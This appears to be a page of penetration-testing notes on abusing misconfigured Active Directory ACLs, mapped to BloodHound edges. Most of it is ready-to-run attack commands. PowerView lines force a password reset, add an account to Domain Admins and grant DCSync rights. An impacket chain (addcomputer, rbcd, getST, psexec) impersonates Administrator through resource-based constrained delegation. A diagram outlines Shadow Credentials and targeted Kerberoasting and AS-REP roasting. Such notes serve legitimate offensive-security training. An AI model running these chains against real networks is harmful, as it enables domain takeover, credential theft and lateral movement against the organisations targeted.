> [!tip] Discovery
> Manually enumerate ACEs/SIDs before abuse: [[Active Directory/PowerView & Manual AD Enumeration#9. Enumerate AD object ACLs|AD object ACL enumeration]].

**An ACL is the list of "who is allowed to do what" to an AD object.** Admins misconfigure these constantly, and BloodHound draws each one as an arrow between accounts. Each right is its own attack: **GenericAll** = full control (reset their password, or add yourself to a group). **WriteDACL** = you can grant yourself _more_ rights, including DCSync. **GenericWrite** = enough for Shadow Credentials or targeted Kerberoasting. **GenericAll on a computer** = set up RBCD to impersonate its admin. The commands below map one-to-one to those BloodHound edges.

```
# GenericAll on User → force password reset:
Set-DomainUserPassword -Identity targetuser \
    -AccountPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force)

# GenericAll on Group → add to Domain Admins:
Add-DomainGroupMember -Identity "Domain Admins" -Members stephanie

# WriteDACL on Domain → grant DCSync rights:
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
    -PrincipalIdentity stephanie -Rights DCSync
# → now run secretsdump

# GenericAll on Computer → RBCD Attack:
addcomputer.py -computer-name 'ATTACKPC$' -computer-pass 'Attack123!' \
    'corp.local/stephanie:Password123' -dc-ip 192.168.x.100
rbcd.py -delegate-to <TARGET_COMPUTER>$ -delegate-from ATTACKPC$ \
    -dc-ip 192.168.x.100 -action write 'corp.local/stephanie:Password123'
getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
    'corp.local/ATTACKPC$:Attack123!' -dc-ip 192.168.x.100
export KRB5CCNAME=Administrator@cifs_<TARGET_FQDN>@CORP.LOCAL.ccache
psexec.py -k -no-pass corp.local/Administrator@<TARGET_FQDN>
```

## GenericWrite / GenericAll on User — roasting options

Besides forcing a password reset, these rights can sometimes be abused without immediately changing the user's password:

```text
GenericWrite / GenericAll on user
├─ Shadow Credentials
├─ Targeted Kerberoasting
│   ├─ temporarily set an SPN
│   ├─ request TGS
│   └─ remove SPN afterward
└─ Targeted AS-REP Roasting
    ├─ temporarily disable Kerberos preauthentication
    ├─ request AS-REP hash
    └─ restore original UAC value afterward
```

See [[Active Directory/Attack-Phases/Phase-2-3/Kerberoasting|Kerberoasting]] and [[Active Directory/Attack-Phases/Phase-2-3/AS-REP Roasting|AS-REP Roasting]].
